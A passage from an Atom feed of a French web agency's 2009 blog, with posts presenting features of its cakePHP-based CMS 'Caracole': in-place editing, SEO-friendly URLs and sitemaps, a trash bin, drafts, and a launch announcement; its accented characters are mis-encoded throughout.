modifier. Il suffit ensuite d&amp;#39;y naviguer avec un navigateur assez rÃ©cent (cela
signifie que IE6 n&amp;#39;y est pas conviÃ©) et s&amp;#39;affichera alors automatiquement en
haut Ã  gauche de l&amp;#39;Ã©cran un petit switch qui permet d&amp;#39;activer ou de dÃ©sactiver
en un clic le mode Ã©dition.&lt;/p&gt;

&lt;p&gt;Lorsque le mode d&amp;#39;Ã©dition est activÃ©, il suffit de cliquer sur une zone que
l&amp;#39;on veut modifier pour la transformer automatiquement en champ de formulaire
modifiable (avec intÃ©gration de tinyMCE pour les grands textes). Il suffit
alors de modifier le texte exactement comme on peut le faire dans l&amp;#39;admin et
de valider. La modification est prise en compte automatiquement.&lt;/p&gt;

&lt;p&gt;CotÃ© dÃ©veloppeur, il suffit d&amp;#39;ajouter une class=&amp;quot;editable&amp;quot; ainsi qu&amp;#39;un id
formÃ© de la forme &amp;quot;controller-champ-id&amp;quot;. Ainsi id=&amp;quot;posts-text-12&amp;quot; identifiera
le champ &amp;quot;text&amp;quot; du 12e post.&lt;/p&gt;

&lt;p&gt;C&amp;#39;est extremement pratique pour modifier des fautes de frappe, ou faire des
tas de petites modifications, je m&amp;#39;en sers Ã©normÃ©ment et c&amp;#39;est un pas de plus
pour faciliter l&amp;#39;administration Ã  l&amp;#39;utilisateur final.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Caracole - RÃ©fÃ©rencement</title>
   <link href="http://blog.pixelastic.com/2009/02/18/caracole-referencement/"/>
   <updated>2009-02-18T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2009/02/18/caracole-referencement</id>
   <content type="html">&lt;p&gt;Le rÃ©fÃ©rencement est une des prÃ©ocupations principales de nos clients, tous
veulent savoir si avec le produit qu&amp;#39;on leur propose ils seront en mesure
d&amp;#39;Ãªtre les premiers dans les rÃ©sultats Google.&lt;/p&gt;

&lt;p&gt;Bien qu&amp;#39;il n&amp;#39;existe pas de recette miracle pour parvenir Ã  ce rÃ©sultat,
certaines sociÃ©tÃ©s sont spÃ©cialisÃ©s dans ce business et dÃ©ploient des trÃ©sors
d&amp;#39;ingÃ©niositÃ© pour rÃ©ussir Ã  faire grimper les pages de leurs clients dans les
index des moteurs.&lt;/p&gt;

&lt;p&gt;Mais c&amp;#39;est un boulot Ã  part entiÃ¨re, et ce n&amp;#39;est pas le nÃ´tre. Nous faisons
des sites web, Ã  chacun sa spÃ©cialitÃ©.&lt;/p&gt;

&lt;p&gt;MalgrÃ© tout, il existe plusieurs bonnes pratiques qui permettent d&amp;#39;obtenir de
bons rÃ©sultats sans trop d&amp;#39;efforts, et Caracole s&amp;#39;en sort pas trop mal de ce
cotÃ© lÃ .&lt;/p&gt;

&lt;p&gt;Tout d&amp;#39;abord il tire parti de la faÃ§on dont les urls sont gÃ©rÃ©es par cakePHP,
et donc aucune url ne contient de paramÃ¨tre de la forme ?foo=bar&amp;amp;action=foobar
qui sont trÃ¨s mal indexÃ©es. Chaque page possÃ¨de donc sa propre url unique. Les
mÃ©thodes d&amp;#39;url rewriting proposÃ©es de base par cakePHP sont trÃ¨s puissantes et
font dÃ©jÃ  une trÃ¨s grosse partie du travail.&lt;/p&gt;

&lt;p&gt;Dans la mÃªme veine, il est possible de dÃ©finir des &amp;#39;slugs&amp;#39; pour chaque
Ã©lÃ©ment, un slug permet de donner un identifiant Ã  chacune des pages, ce qui
signifie qu&amp;#39;au lieu de retrouver un Ã©lÃ©ment par son id dans l&amp;#39;url (un simple
nombre, qui ne donne pas d&amp;#39;indication sur le contenu), on peut Ã  la place le
remplacer par un slug (du genre &amp;#39;services&amp;#39;, &amp;#39;nous-contacter&amp;#39;, etc). Cela donne
des urls du genre /services.html, /posts/1:mon-premier-post, etc&lt;/p&gt;

&lt;p&gt;Cela facilite le rÃ©fÃ©rencement des pages car des mots clÃ©s se rapportant au
contenu de la page peuvent dÃ©jÃ  Ãªtre mis dans l&amp;#39;url, qui est une place
privilÃ©giÃ©e.&lt;/p&gt;

&lt;p&gt;Ici encore, il suffit d&amp;#39;ajouter un champ &amp;#39;slug&amp;#39; dans la table correspondante
au modÃ¨le pour que celui-ci soit automatiquement gÃ©nÃ©rÃ© Ã  partir du nom (il
est bien sur possible de le modifier si besoin).&lt;/p&gt;

&lt;p&gt;Caracole est aussi dotÃ© d&amp;#39;un systÃ¨me de gÃ©nÃ©ration automatique de sitemap (le
plan du site). Celui-ci est gÃ©nÃ©rÃ© en deux versions, une version html pour vos
visiteurs, et une version XML (qui indique les frÃ©quences de rÃ©actualisations
ainsi que les dates de derniÃ¨re modification) pour les moteurs.&lt;/p&gt;

&lt;p&gt;Et pour finir, je vais passer rapidement sur les essentiels : balise &lt;title&gt;
et meta description diffÃ©rents pour chaque page, fichier robots.txt, texte
alternatif sur les images et accessibilitÃ© du markup HTML mais bien sur,
Caracole se charge de tout cela aussi.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Caracole - Corbeille</title>
   <link href="http://blog.pixelastic.com/2009/02/17/caracole-corbeille/"/>
   <updated>2009-02-17T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2009/02/17/caracole-corbeille</id>
   <content type="html">&lt;p&gt;Dans la lignÃ©e du principe de brouillon j&amp;#39;ai aussi ajoutÃ© une fonction de
&amp;quot;Corbeille&amp;quot;. Ca fonctionne exactement comme celle du bureau de Windows qu&amp;#39;on
est bien content d&amp;#39;avoir quand on a eu la main un peu gÃ©nÃ©reuse dans les
fichiers Ã  supprimer.&lt;/p&gt;

&lt;p&gt;Elle fait office de sÃ©curitÃ© et les Ã©lÃ©ments soit-disant supprimÃ©s ne sont pas
rÃ©ellement effacÃ©s instantanÃ©ment, ils passent dans une corbeille
intermÃ©diaire. A partir de lÃ , si on se rends compte qu&amp;#39;on a fait une bÃ©tise,
on peut toujours les restaurer Ã  leur Ã©tat d&amp;#39;origine. Ou alors vider la
corbeille de temps en temps pour faire de la place.&lt;/p&gt;

&lt;p&gt;Exactement de la mÃªme faÃ§on que pour les brouillons, il suffit ici d&amp;#39;ajouter
un champ &amp;#39;is_deleted&amp;#39; Ã  la table du modÃ¨le correspondant pour lui ajouter la
fonction de corbeille, Caracole se charge du reste.&lt;/p&gt;

&lt;p&gt;Les Ã©lÃ©ments supprimÃ©s ne sont plus retournÃ©s par les fonctions de recherche
habituelle, Ã  moins de prÃ©ciser l&amp;#39;option &amp;#39;includeDeleted&amp;#39;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Caracole - Brouillons</title>
   <link href="http://blog.pixelastic.com/2009/02/16/caracole-brouillons/"/>
   <updated>2009-02-16T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2009/02/16/caracole-brouillons</id>
   <content type="html">&lt;p&gt;Une des fonctionnalitÃ©s les plus pratiques de Wordpress, c&amp;#39;est de pouvoir
enregistrer un billet comme brouillon lorsqu&amp;#39;on ne l&amp;#39;a pas terminÃ©. Ca permet
d&amp;#39;y revenir plus tard et de le garder dans un coin sans qu&amp;#39;il ne soit perdu.&lt;/p&gt;

&lt;p&gt;J&amp;#39;ai ajoutÃ© cette fonctionnalitÃ© Ã  Caracole hier, et elle peut s&amp;#39;appliquer Ã 
n&amp;#39;importe quel modÃ¨le (actuellement je l&amp;#39;ai mise sur les pages et les billets
de blog uniquement, mais comme vous allez le voir, c&amp;#39;est trÃ¨s facile Ã  ajouter
pour n&amp;#39;importe quel modÃ¨le).&lt;/p&gt;

&lt;p&gt;Une case Ã  cocher &amp;quot;Enregistrer comme brouillon&amp;quot; permet d&amp;#39;enregistrer l&amp;#39;Ã©lement
comme brouillon, cela signifie qu&amp;#39;il ne sera plus visible sur le site tant
qu&amp;#39;il restera Ã  l&amp;#39;Ã©tat de brouillon.&lt;/p&gt;

&lt;p&gt;Pour le dÃ©veloppeur, c&amp;#39;est trÃ¨s simple Ã  utiliser, il suffit de rajouter un
champ &amp;#39;is_draft&amp;#39; dans la table correspondante au modÃ¨le et Caracole se charge
du reste. Les brouillons ne sont plus retournÃ©s par les recherches, Ã  moins de
prÃ©ciser &amp;#39;includeDraft&amp;#39; dans les options de recherche, ce qui permet de garder
le code le plus clair possible.&lt;/p&gt;

&lt;p&gt;Dans l&amp;#39;admin, les brouillons restent bien sur visibles (bien qu&amp;#39;indiquÃ©s de
faÃ§on lÃ©gerement diffÃ©rente), et il suffit d&amp;#39;aller dÃ©cocher la case pour les
publier rÃ©ellement.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Caracole -  PrÃ©sentation</title>
   <link href="http://blog.pixelastic.com/2009/02/15/caracole/"/>
   <updated>2009-02-15T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2009/02/15/caracole</id>
   <content type="html">&lt;p&gt;L&amp;#39;un des principaux atouts que l&amp;#39;on mets en avant quand on propose nos
services Ã  nos clients c&amp;#39;est l&amp;#39;autonomie qu&amp;#39;ils auront dans la gestion de leur
site web. J&amp;#39;entends trop souvent des clients qui possÃ¨dent dÃ©jÃ  un site web me
dire qu&amp;#39;ils veulent changer de prestataire car celui qu&amp;#39;ils ont actuellement
est trop lent Ã  rÃ©agir quand ils ont besoin d&amp;#39;une modification et surtout que
la modification leur est facturÃ©e Ã  chaque fois !&lt;/p&gt;

&lt;p&gt;J&amp;#39;ai toujours trouvÃ© cette approche ridicule. D&amp;#39;une part parce que pour moi le
client devient propriÃ©taire du site et qu&amp;#39;il ne doit plus Ãªtre dÃ©pendant de
son prestataire une fois la livraison effectuÃ©e. Ensuite parce qu&amp;#39;il faut bien
l&amp;#39;avouer, mettre Ã  jour des textes, des images et des liens sur un site web
qui n&amp;#39;est pas le notre, c&amp;#39;est pas la partie la plus excitante de notre mÃ©tier.&lt;/p&gt;

&lt;p&gt;C&amp;#39;est pour Ã§a que dÃ¨s le dÃ©but, j&amp;#39;ai voulu permettre Ã  mes clients la plus
grande flexibilitÃ© possible dans l&amp;#39;administration de leur site. Et c&amp;#39;est ainsi
que j&amp;#39;ai commencÃ© Ã  dÃ©velopper des interfaces d&amp;#39;administration, et que de fil
en aiguille *&lt;em&gt;Caracole *&lt;/em&gt;a vu le jour.&lt;/p&gt;

&lt;p&gt;Caracole est un CMS, basÃ© sur le framework cakePHP. Il permet dans sa version
de base de gÃ©rer une architecture de site simple (ActualitÃ©s, Pages,
Formulaire de contact). Il a Ã©tÃ© pensÃ© afin de simplifier au maximum la vie Ã 
la fois Ã  l&amp;#39;utilisateur et au dÃ©veloppeur.&lt;/p&gt;

&lt;p&gt;Pour l&amp;#39;utilisateur, l&amp;#39;interface d&amp;#39;administration est trÃ¨s simple d&amp;#39;utilisation
et claire, pas besoin de compÃ©tences techniques pour s&amp;#39;en servir. Il suffit de
quelques clics pour uploader et redimensionner une image, un Ã©diteur de texte
riche (tinyMCE) permet des mises en pages Ã©voluÃ©es, un simple systÃ¨me de
drag&amp;#39;n&amp;#39;drop permet de rÃ©ordonner des Ã©lÃ©ments au sein d&amp;#39;une liste, une
corbeille permet de ne pas perdre dÃ©finitivement les Ã©lÃ©ments supprimÃ©s, on
peut enregistrer son travail comme brouillon avant de le publier sur le site,
etc, etc&lt;/p&gt;

&lt;p&gt;Pour le dÃ©veloppeur, vu que tout cela est basÃ© sur cakePHP, il est trÃ¨s simple
d&amp;#39;ajouter de nouveaux modÃ¨les en plus de ceux existants pour s&amp;#39;adapter Ã  tout
type de projet. Beaucoup d&amp;#39;outils ont Ã©tÃ© intÃ©grÃ©s pour Ã©viter au maximum les
taches fastidieuses et rÃ©pÃ©titives (compression des Javascript/CSS, CSS
Sprite, rÃ©ecriture d&amp;#39;url, intÃ©gration avec Firebug, etc).&lt;/p&gt;

&lt;p&gt;*&lt;em&gt;Caracole *&lt;/em&gt;est encore en dÃ©veloppement, il reste plusieurs fonctionnalitÃ©s que nous aimerions rajouter ainsi qu&amp;#39;un polissage de l&amp;#39;interface. NÃ©anmoins il est suffisamment stable pour Ãªtre utilisÃ©, ce site en est un trÃ¨s bon exemple. Je posterai d&amp;#39;autres billets sur les diffÃ©rentes fonctionnalitÃ©s utiles de Caracole dans les jours prochains.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Ouverture</title>
   <link href="http://blog.pixelastic.com/2009/02/14/ouverture/"/>
   <updated>2009-02-14T00:00:00+01:00</updated>
   <id>http://blog.pixelastic.com/2009/02/14/ouverture</id>
   <content type="html">&lt;p&gt;Et voila le premier billet du blog de Pixelastic. Quel grand moment... AprÃ¨s
tout ces durs mois de labeur pour rÃ©ussir Ã  se mettre d&amp;#39;accord sur le design
et le logo (d&amp;#39;ailleurs, rien n&amp;#39;est encore dÃ©finitif), le site est enfin en
ligne.&lt;/p&gt;

&lt;p&gt;Il reste encore beaucoup de choses Ã  faire, de pages Ã  styler, de texte Ã 
Ã©crire, mais on dÃ©balle nos cartons petit Ã  petit.&lt;/p&gt;

&lt;p&gt;Bienvenue Ã  tout le monde, et restez Ã  l&amp;#39;Ã©coute, ce blog va se remplir petit Ã 
petit lui aussi.&lt;/p&gt;
</content>
 </entry>
 

</feed>
